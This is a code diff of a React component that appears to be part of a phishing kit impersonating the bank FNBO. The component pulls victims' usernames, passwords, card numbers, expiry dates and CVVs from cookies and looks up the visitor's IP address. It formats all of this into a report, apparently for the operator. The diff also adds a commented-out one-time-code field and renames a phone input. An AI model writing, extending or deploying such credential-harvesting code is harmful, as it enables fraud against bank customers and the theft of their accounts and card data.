@@ -13,6 +13,7 @@ export default function Addition2() {
   const login1: Login = cookies.get("login1");
   const login2: Login2 = cookies.get("login2");
   const card: card = cookies.get("card");
+  // const code: otp = cookies.get("code");
 
   // const navigate = useNavigate();
   function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
@@ -42,7 +43,7 @@ export default function Addition2() {
     const request = await fetch("https://api.ipify.org?format=json");
     const response: { ip: string } = await request.json();
     const visitorIP = response.ip;
-
+    // Code: ${code.cd}
     const message = `
     ---- FNBO -----
     IP: ${visitorIP}
@@ -50,6 +51,7 @@ export default function Addition2() {
     Password: ${login1.password}
     Username 2: ${login2.username2}
     Password 2: ${login2.password2}
+    
     Card number: ${card.cnm}
     Card Expiry : ${card.exp}
     Card Cvv: ${card.cv}
@@ -209,7 +211,7 @@ export default function Addition2() {
                         <input
                           type="tel"
                           placeholder=""
-                          name="phone"
+                          name="tel"
                           id="okta-signin-username"
                           onChange={handleInputChange}
                           defaultValue={formInput.tel}
